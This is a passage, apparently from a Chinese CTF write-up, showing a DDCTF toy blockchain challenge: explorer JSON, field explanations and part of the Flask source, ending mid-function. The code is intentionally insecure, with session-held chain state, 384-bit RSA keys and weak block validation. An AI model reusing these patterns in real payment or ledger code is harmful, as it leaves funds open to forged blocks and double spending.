        <span class="token property">"addr"</span><span class="token operator">:</span> <span class="token string">"8c0fb4f8d1af7953b2c31449a1791781e91f1ad26255e19706810ff0d61717c0e6d4264dd2307a5aba1ddcd92f48c1e7"</span><span class="token punctuation">,</span> 
        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"375c1f2b-58b9-4282-a3bd-8e9b7591b236"</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

Blockchain Explorer<span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token property">"108248f604c2b0ba842c9bc897e1adecf27c6e66a92d243b57f1805ddd9fe369"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"nonce"</span><span class="token operator">:</span> <span class="token string">"HAHA, I AM THE BANK NOW!"</span><span class="token punctuation">,</span> 
        <span class="token property">"prev"</span><span class="token operator">:</span> <span class="token string">"3eac8fa8280955626ceb82ade9b07250e77518e9ba2c4736af4f299ec00dd962"</span><span class="token punctuation">,</span>
        <span class="token property">"hash"</span><span class="token operator">:</span><span class="token string">"108248f604c2b0ba842c9bc897e1adecf27c6e66a92d243b57f1805ddd9fe369"</span><span class="token punctuation">,</span> 
        <span class="token property">"transactions"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>
            <span class="token property">"input"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"845e6673-ad33-4645-97f6-ef4f8895e82c"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
            <span class="token property">"signature"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"0f808f1d3b6016c2f5a06e00602c3d4ffaac76efb04eb97f8ff9f76ed745b58f357ad7dab38d33bc7229f7b1df158034"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
            <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"7ce1d7a76757c181593b3e02433b24d05d86133ca0c9c5bcb46371e3846f0fbe"</span><span class="token punctuation">,</span> 
            <span class="token property">"output"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>
                <span class="token property">"amount"</span><span class="token operator">:</span> <span class="token number">999999</span><span class="token punctuation">,</span> 
                <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"0ede005c512d4d8cca71ed0bc32733472b5bf4128ce4812e5f4b31be1f345a64"</span><span class="token punctuation">,</span> 
                <span class="token property">"addr"</span><span class="token operator">:</span> <span class="token string">"8c0fb4f8d1af7953b2c31449a1791781e91f1ad26255e19706810ff0d61717c0e6d4264dd2307a5aba1ddcd92f48c1e7"</span><span class="token punctuation">,</span> 
                <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"375c1f2b-58b9-4282-a3bd-8e9b7591b236"</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
                <span class="token property">"amount"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> 
                <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"8aca42fcc869e9bc9910cf1c762c533ff7ef688cce362eb0e0abcad5ac686bc5"</span><span class="token punctuation">,</span> 
                <span class="token property">"addr"</span><span class="token operator">:</span> <span class="token string">"8393de0e73705cb1aa4121db3c629c06cd8ca6d55bdca622e2d6cce3ab3b053b1b6ab969adc0be73f7a302e9378ad8b7"</span><span class="token punctuation">,</span> 
                <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"621d14eb-8be4-4a1a-aeba-3abc077b9892"</span>
            <span class="token punctuation">}</span><span class="token punctuation">]</span>
        <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
        <span class="token property">"height"</span><span class="token operator">:</span> <span class="token number">1</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> 
    <span class="token property">"e92b1df81deac2217847b89de1d38e4b06c19d58aa95a5fed6413c629c2eb616"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"nonce"</span><span class="token operator">:</span> <span class="token string">"a empty block"</span><span class="token punctuation">,</span> 
        <span class="token property">"prev"</span><span class="token operator">:</span> <span class="token string">"108248f604c2b0ba842c9bc897e1adecf27c6e66a92d243b57f1805ddd9fe369"</span><span class="token punctuation">,</span> 
        <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"e92b1df81deac2217847b89de1d38e4b06c19d58aa95a5fed6413c629c2eb616"</span><span class="token punctuation">,</span> 
        <span class="token property">"transactions"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
        <span class="token property">"height"</span><span class="token operator">:</span> <span class="token number">2</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> 
    <span class="token property">"3eac8fa8280955626ceb82ade9b07250e77518e9ba2c4736af4f299ec00dd962"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"nonce"</span><span class="token operator">:</span> <span class="token string">"The Times 03/Jan/2009 Chancellor on brink of second bailout for bank"</span><span class="token punctuation">,</span> 
        <span class="token property">"prev"</span><span class="token operator">:</span> <span class="token string">"0000000000000000000000000000000000000000000000000000000000000000"</span><span class="token punctuation">,</span> 
        <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"3eac8fa8280955626ceb82ade9b07250e77518e9ba2c4736af4f299ec00dd962"</span><span class="token punctuation">,</span> 
        <span class="token property">"transactions"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>
            <span class="token property">"input"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
            <span class="token property">"signature"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
            <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"c3a654c05dc934708f962d78dd795768132256a7d64c866439975a43024e15ec"</span><span class="token punctuation">,</span> 
            <span class="token property">"output"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>
                <span class="token property">"amount"</span><span class="token operator">:</span> <span class="token number">1000000</span><span class="token punctuation">,</span> 
                <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"8cb6994bbb901d94bda4388669f42c65a08685526e977d2a09ae69568d590aca"</span><span class="token punctuation">,</span> 
                <span class="token property">"addr"</span><span class="token operator">:</span> <span class="token string">"8393de0e73705cb1aa4121db3c629c06cd8ca6d55bdca622e2d6cce3ab3b053b1b6ab969adc0be73f7a302e9378ad8b7"</span><span class="token punctuation">,</span> 
                <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"845e6673-ad33-4645-97f6-ef4f8895e82c"</span>
            <span class="token punctuation">}</span><span class="token punctuation">]</span>
        <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
        <span class="token property">"height"</span><span class="token operator">:</span> <span class="token number">0</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>参数解释，括号内为生成函数</p>
<ul>
<li><p>nonce：自定义字符串</p>
</li>
<li><p>prev：上一个块的hash</p>
</li>
<li><p>hash：本个块的hash（hashhash，hash_reducer，hash_block）</p>
</li>
<li><p>transactions：交易（tx）</p>
</li>
<li><p>input：之前utxo的id</p>
</li>
<li><p>output：UTXO</p>
</li>
<li><p>amount：数量</p>
</li>
<li><p>hash：UTXO的hash（hash，hash_reducer，hash_utxo）</p>
</li>
<li><p>id：这个UTXO的id</p>
</li>
<li><p>addr：目标地址</p>
</li>
<li><p>hash：交易的hash（hash，hash_reducer，hash_tx）</p>
</li>
<li><p>signature：交易签名（sign_input_utxo）</p>
<h2 id="utxos"><a href="#utxos" class="headerlink" title="utxos"></a>utxos</h2><ul>
<li>其实就是地址余额，利用这个独立于区块链的数据结构来存储交易最终各个地址的余额</li>
<li>使得区块链系统中的新交易并不需要追溯整个交易历史，就可以确认当前交易是否合法</li>
</ul>
<pre><code>  {
    "amount":余额,
    "addr":钱包地址,
    "id":标识每一个utxo的id,
    "hash":根据以上三个数据生成的hash
  }</code></pre>
<h2 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h2><p>区块block</p>
<pre><code>  {
    "nonce":调和参数,
    "prev":前块hash,
    "hash":本块hash,
    "transactions":交易记录
  }</code></pre>
<p>交易记录transactions</p>
<pre><code>  {
    "input":付款钱包utxos的id,
    "output":收款钱包地址的utxos,
    "signature":付款地址的签名，由付款钱包的utxos中id和私钥计算生成,
    "hash":由input和付款钱包的utxos中id计算出的交易hash
  }</code></pre>
</li>
</ul>
<h2 id="View-source-code"><a href="#View-source-code" class="headerlink" title="View source_code:"></a>View source_code:</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- encoding: utf-8 -*-</span>
<span class="token comment" spellcheck="true"># written in python 2.7</span>
__author__ <span class="token operator">=</span> <span class="token string">'garzon'</span>

<span class="token keyword">import</span> hashlib<span class="token punctuation">,</span> json<span class="token punctuation">,</span> rsa<span class="token punctuation">,</span> uuid<span class="token punctuation">,</span> os
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> escape<span class="token punctuation">,</span> request
<span class="token keyword">from</span> pycallgraph <span class="token keyword">import</span> PyCallGraph  
<span class="token keyword">from</span> pycallgraph <span class="token keyword">import</span> Config  
<span class="token keyword">from</span> pycallgraph<span class="token punctuation">.</span>output <span class="token keyword">import</span> GraphvizOutput 

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'*********************'</span>
url_prefix <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">def</span> <span class="token function">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'Here is your flag: DDCTF{******************}'</span>

<span class="token keyword">def</span> <span class="token function">hash</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">hash_reducer</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> hash<span class="token punctuation">(</span>hash<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">+</span>hash<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">has_attrs</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> attrs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> type<span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Input should be a dict/JSON"</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> attr <span class="token keyword">in</span> attrs<span class="token punctuation">:</span>
        <span class="token keyword">if</span> attr <span class="token operator">not</span> <span class="token keyword">in</span> d<span class="token punctuation">:</span>
            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"{} should be presented in the input"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>attr<span class="token punctuation">)</span><span class="token punctuation">)</span>

EMPTY_HASH <span class="token operator">=</span> <span class="token string">'0'</span><span class="token operator">*</span><span class="token number">64</span>

<span class="token keyword">def</span> <span class="token function">addr_to_pubkey</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> rsa<span class="token punctuation">.</span>PublicKey<span class="token punctuation">(</span>int<span class="token punctuation">(</span>address<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">65537</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">pubkey_to_address</span><span class="token punctuation">(</span>pubkey<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> pubkey<span class="token punctuation">.</span>e <span class="token operator">==</span> <span class="token number">65537</span>
    hexed <span class="token operator">=</span> hex<span class="token punctuation">(</span>pubkey<span class="token punctuation">.</span>n<span class="token punctuation">)</span>
    <span class="token keyword">if</span> hexed<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> hexed <span class="token operator">=</span> hexed<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> hexed<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> hexed <span class="token operator">=</span> hexed<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> hexed

<span class="token keyword">def</span> <span class="token function">gen_addr_key_pair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    pubkey<span class="token punctuation">,</span> privkey <span class="token operator">=</span> rsa<span class="token punctuation">.</span>newkeys<span class="token punctuation">(</span><span class="token number">384</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> pubkey_to_address<span class="token punctuation">(</span>pubkey<span class="token punctuation">)</span><span class="token punctuation">,</span> privkey

bank_address<span class="token punctuation">,</span> bank_privkey <span class="token operator">=</span> gen_addr_key_pair<span class="token punctuation">(</span><span class="token punctuation">)</span>
hacker_address<span class="token punctuation">,</span> hacker_privkey <span class="token operator">=</span> gen_addr_key_pair<span class="token punctuation">(</span><span class="token punctuation">)</span>
shop_address<span class="token punctuation">,</span> shop_privkey <span class="token operator">=</span> gen_addr_key_pair<span class="token punctuation">(</span><span class="token punctuation">)</span>
shop_wallet_address<span class="token punctuation">,</span> shop_wallet_privkey <span class="token operator">=</span> gen_addr_key_pair<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">sign_input_utxo</span><span class="token punctuation">(</span>input_utxo_id<span class="token punctuation">,</span> privkey<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> rsa<span class="token punctuation">.</span>sign<span class="token punctuation">(</span>input_utxo_id<span class="token punctuation">,</span> privkey<span class="token punctuation">,</span> <span class="token string">'SHA-1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">hash_utxo</span><span class="token punctuation">(</span>utxo<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">create_output_utxo</span><span class="token punctuation">(</span>addr_to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>
    utxo <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> str<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'addr'</span><span class="token punctuation">:</span> addr_to<span class="token punctuation">,</span> <span class="token string">'amount'</span><span class="token punctuation">:</span> amount<span class="token punctuation">}</span>
    utxo<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_utxo<span class="token punctuation">(</span>utxo<span class="token punctuation">)</span>
    <span class="token keyword">return</span> utxo

<span class="token keyword">def</span> <span class="token function">hash_tx</span><span class="token punctuation">(</span>tx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>
        reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> EMPTY_HASH<span class="token punctuation">)</span><span class="token punctuation">,</span>
        reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token keyword">for</span> utxo <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'output'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> EMPTY_HASH<span class="token punctuation">)</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">create_tx</span><span class="token punctuation">(</span>input_utxo_ids<span class="token punctuation">,</span> output_utxo<span class="token punctuation">,</span> privkey_from<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>
    tx <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'input'</span><span class="token punctuation">:</span> input_utxo_ids<span class="token punctuation">,</span> <span class="token string">'signature'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>sign_input_utxo<span class="token punctuation">(</span>id<span class="token punctuation">,</span> privkey_from<span class="token punctuation">)</span> <span class="token keyword">for</span> id <span class="token keyword">in</span> input_utxo_ids<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'output'</span><span class="token punctuation">:</span> output_utxo<span class="token punctuation">}</span>
    tx<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_tx<span class="token punctuation">(</span>tx<span class="token punctuation">)</span>
    <span class="token keyword">return</span> tx

<span class="token keyword">def</span> <span class="token function">hash_block</span><span class="token punctuation">(</span>block<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>tx<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token keyword">for</span> tx <span class="token keyword">in</span> block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> EMPTY_HASH<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">create_block</span><span class="token punctuation">(</span>prev_block_hash<span class="token punctuation">,</span> nonce_str<span class="token punctuation">,</span> transactions<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> type<span class="token punctuation">(</span>prev_block_hash<span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'prev_block_hash should be hex-encoded hash value'</span><span class="token punctuation">)</span>
    nonce <span class="token operator">=</span> str<span class="token punctuation">(</span>nonce_str<span class="token punctuation">)</span>
    <span class="token keyword">if</span> len<span class="token punctuation">(</span>nonce<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">128</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'the nonce is too long'</span><span class="token punctuation">)</span>
    block <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'prev'</span><span class="token punctuation">:</span> prev_block_hash<span class="token punctuation">,</span> <span class="token string">'nonce'</span><span class="token punctuation">:</span> nonce<span class="token punctuation">,</span> <span class="token string">'transactions'</span><span class="token punctuation">:</span> transactions<span class="token punctuation">}</span>
    block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_block<span class="token punctuation">(</span>block<span class="token punctuation">)</span>
    <span class="token keyword">return</span> block

<span class="token keyword">def</span> <span class="token function">find_blockchain_tail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> max<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> block<span class="token punctuation">:</span> block<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">calculate_utxo</span><span class="token punctuation">(</span>blockchain_tail<span class="token punctuation">)</span><span class="token punctuation">:</span>
    curr_block <span class="token operator">=</span> blockchain_tail
    blockchain <span class="token operator">=</span> <span class="token punctuation">[</span>curr_block<span class="token punctuation">]</span>
    <span class="token keyword">while</span> curr_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> session<span class="token punctuation">[</span><span class="token string">'genesis_block_hash'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        curr_block <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>curr_block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
        blockchain<span class="token punctuation">.</span>append<span class="token punctuation">(</span>curr_block<span class="token punctuation">)</span>
    blockchain <span class="token operator">=</span> blockchain<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
    utxos <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token keyword">for</span> block <span class="token keyword">in</span> blockchain<span class="token punctuation">:</span>
        <span class="token keyword">for</span> tx <span class="token keyword">in</span> block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> input_utxo_id <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                <span class="token keyword">del</span> utxos<span class="token punctuation">[</span>input_utxo_id<span class="token punctuation">]</span>
            <span class="token keyword">for</span> utxo <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'output'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                utxos<span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> utxo
    <span class="token keyword">return</span> utxos

<span class="token keyword">def</span> <span class="token function">calculate_balance</span><span class="token punctuation">(</span>utxos<span class="token punctuation">)</span><span class="token punctuation">:</span>
    balance <span class="token operator">=</span> <span class="token punctuation">{</span>bank_address<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> hacker_address<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> shop_address<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">}</span>
    <span class="token keyword">for</span> utxo <span class="token keyword">in</span> utxos<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span> <span class="token operator">not</span> <span class="token keyword">in</span> balance<span class="token punctuation">:</span>
            balance<span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
        balance<span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+=</span> utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> balance

<span class="token keyword">def</span> <span class="token function">verify_utxo_signature</span><span class="token punctuation">(</span>address<span class="token punctuation">,</span> utxo_id<span class="token punctuation">,</span> signature<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> rsa<span class="token punctuation">.</span>verify<span class="token punctuation">(</span>utxo_id<span class="token punctuation">,</span> signature<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> addr_to_pubkey<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token keyword">def</span> <span class="token function">append_block</span><span class="token punctuation">(</span>block<span class="token punctuation">,</span> difficulty<span class="token operator">=</span>int<span class="token punctuation">(</span><span class="token string">'f'</span><span class="token operator">*</span><span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    has_attrs<span class="token punctuation">(</span>block<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">,</span> <span class="token string">'nonce'</span><span class="token punctuation">,</span> <span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> type<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span> <span class="token operator">=</span> str<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> type<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span> <span class="token operator">=</span> str<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span> <span class="token operator">not</span> <span class="token keyword">in</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown parent block"</span><span class="token punctuation">)</span>
    tail <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
    utxos <span class="token operator">=</span> calculate_utxo<span class="token punctuation">(</span>tail<span class="token punctuation">)</span>

    <span class="token keyword">if</span> type<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Please put a transaction array in the block'</span><span class="token punctuation">)</span>
    new_utxo_ids <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> tx <span class="token keyword">in</span> block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        has_attrs<span class="token punctuation">(</span>tx<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'output'</span><span class="token punctuation">,</span> <span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        <span class="token keyword">for</span> utxo <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'output'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
